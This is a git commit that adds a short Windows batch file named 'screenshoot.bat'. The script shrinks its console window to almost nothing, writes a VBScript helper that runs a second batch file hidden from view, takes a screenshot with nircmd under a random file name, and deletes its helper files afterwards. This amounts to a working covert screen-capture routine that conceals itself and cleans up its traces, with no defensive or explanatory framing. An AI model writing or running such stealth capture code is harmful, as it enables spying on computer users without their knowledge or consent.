740efbfe7ebdb6ea333537f145cb4780f15a1844
tajmahal1 <101734468+tajmahal1@users.noreply.github.com>
2022-09-29 12:00:52 +0400

    Add files via upload

---
+++ screenshoot.bat
@@ -0,0 +1,8 @@
+@echo off
+@mode 14,1
+(echo set oshell = createobject^("Wscript.Shell"^)
+ echo Dim strargs
+ echo strargs = "cmd /c x.bat"
+ echo oshell.Run strargs,0 ,false)>x.vbs
+(echo nircmd savescreenshot "Photo%random%.png" ^| del x.vbs x.bat)>x.bat
+ start x.vbs | exit
